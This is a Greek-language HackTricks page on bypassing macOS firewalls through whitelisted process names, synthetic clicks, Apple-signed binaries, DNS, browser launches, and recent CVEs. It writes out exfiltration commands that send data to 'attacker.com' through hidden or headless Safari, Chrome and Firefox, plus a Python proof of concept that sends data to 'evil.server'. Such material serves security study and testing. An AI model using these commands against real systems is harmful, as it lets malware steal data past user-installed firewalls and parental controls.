# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Βρέθηκαν τεχνικές

Οι παρακάτω τεχνικές βρέθηκαν να λειτουργούν σε ορισμένες εφαρμογές firewall macOS.

### Κατάχρηση ονομάτων λευκής λίστας

- Για παράδειγμα, καλώντας το κακόβουλο λογισμικό με ονόματα γνωστών διαδικασιών macOS όπως **`launchd`**

### Συνθετικό Κλικ

- Αν το firewall ζητήσει άδεια από τον χρήστη, κάντε το κακόβουλο λογισμικό να **κλικάρει στο επιτρέπω**

### **Χρήση υπογεγραμμένων δυαδικών αρχείων της Apple**

- Όπως **`curl`**, αλλά και άλλα όπως **`whois`**

### Γνωστά domains της Apple

Το firewall μπορεί να επιτρέπει συνδέσεις σε γνωστά domains της Apple όπως **`apple.com`** ή **`icloud.com`**. Και το iCloud θα μπορούσε να χρησιμοποιηθεί ως C2.

### Γενική Παράκαμψη

Ορισμένες ιδέες για να προσπαθήσετε να παρακάμψετε τα firewalls

### Έλεγχος επιτρεπόμενης κίνησης

Γνωρίζοντας την επιτρεπόμενη κίνηση θα σας βοηθήσει να εντοπίσετε πιθανά whitelisted domains ή ποιες εφαρμογές επιτρέπεται να έχουν πρόσβαση σε αυτά.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Κατάχρηση DNS

Οι επιλύσεις DNS γίνονται μέσω της υπογεγραμμένης εφαρμογής **`mdnsreponder`** που πιθανώς θα επιτρέπεται να επικοινωνεί με τους διακομιστές DNS.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Μέσω εφαρμογών προγράμματος περιήγησης

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Φοίνικας
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Σαφάρι
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Μέσω εισβολών διαδικασιών

Αν μπορείτε να **εισάγετε κώδικα σε μια διαδικασία** που επιτρέπεται να συνδεθεί σε οποιονδήποτε διακομιστή, θα μπορούσατε να παρακάμψετε τις προστασίες του τείχους προστασίας:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Πρόσφατες ευπάθειες παράκαμψης τείχους προστασίας macOS (2023-2025)

### Παράκαμψη φίλτρου περιεχομένου ιστού (Screen Time) – **CVE-2024-44206**
Τον Ιούλιο του 2024, η Apple διόρθωσε ένα κρίσιμο σφάλμα στο Safari/WebKit που κατέστρεψε το σύστημα “Φίλτρο περιεχομένου ιστού” που χρησιμοποιείται από τους γονικούς ελέγχους του Screen Time.
Μια ειδικά διαμορφωμένη URI (για παράδειγμα, με διπλό URL-encoded “://”) δεν αναγνωρίζεται από το ACL του Screen Time αλλά γίνεται αποδεκτή από το WebKit, οπότε το αίτημα αποστέλλεται χωρίς φιλτράρισμα. Οποιαδήποτε διαδικασία μπορεί να ανοίξει μια URL (συμπεριλαμβανομένου του sandboxed ή unsigned κώδικα) μπορεί επομένως να φτάσει σε τομείς που είναι ρητά αποκλεισμένοι από τον χρήστη ή ένα προφίλ MDM.

Πρακτική δοκιμή (μη διορθωμένο σύστημα):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Bug στην παραγγελία κανόνων του Packet Filter (PF) σε πρώιμο macOS 14 “Sonoma”
Κατά τη διάρκεια του beta κύκλου του macOS 14, η Apple εισήγαγε μια αναστροφή στο wrapper του userspace γύρω από **`pfctl`**. 
Οι κανόνες που προστέθηκαν με τη λέξη-κλειδί `quick` (που χρησιμοποιείται από πολλές kill-switches VPN) αγνοήθηκαν σιωπηλά, προκαλώντας διαρροές κυκλοφορίας ακόμη και όταν μια GUI VPN/firewall ανέφερε *μπλοκαρισμένο*. Το σφάλμα επιβεβαιώθηκε από αρκετούς προμηθευτές VPN και διορθώθηκε στην RC 2 (build 23A344).

Γρήγορος έλεγχος διαρροής:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Κατάχρηση υπηρεσιών βοηθού υπογεγραμμένων από την Apple (παλαιά – προ-macOS 11.2)
Πριν από το macOS 11.2, η **`ContentFilterExclusionList`** επέτρεπε ~50 δυαδικά αρχεία της Apple όπως το **`nsurlsessiond`** και το App Store να παρακάμπτουν όλα τα τείχη προστασίας φίλτρου υποδοχών που υλοποιήθηκαν με το πλαίσιο Network Extension (LuLu, Little Snitch, κ.λπ.).
Το κακόβουλο λογισμικό μπορούσε απλά να δημιουργήσει μια εξαιρεθείσα διαδικασία—ή να εισάγει κώδικα σε αυτήν—και να σήρα την δική του κίνηση μέσω της ήδη επιτρεπόμενης υποδοχής. Η Apple αφαίρεσε εντελώς τη λίστα εξαιρέσεων στο macOS 11.2, αλλά η τεχνική είναι ακόμα σχετική σε συστήματα που δεν μπορούν να αναβαθμιστούν.

Παράδειγμα απόδειξης της έννοιας (προ-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
---

## Συμβουλές εργαλείων για σύγχρονο macOS

1. Εξετάστε τους τρέχοντες κανόνες PF που δημιουργούν τα GUI firewalls:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Καταγράψτε τα δυαδικά αρχεία που ήδη κατέχουν την άδεια *outgoing-network* (χρήσιμο για piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Προγραμματικά καταχωρίστε το δικό σας φίλτρο περιεχομένου Network Extension σε Objective-C/Swift.
Μια ελάχιστη rootless PoC που προωθεί πακέτα σε τοπική υποδοχή είναι διαθέσιμη στον πηγαίο κώδικα του **LuLu** του Patrick Wardle.

## Αναφορές

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>

{{#include ../../banners/hacktricks-training.md}}
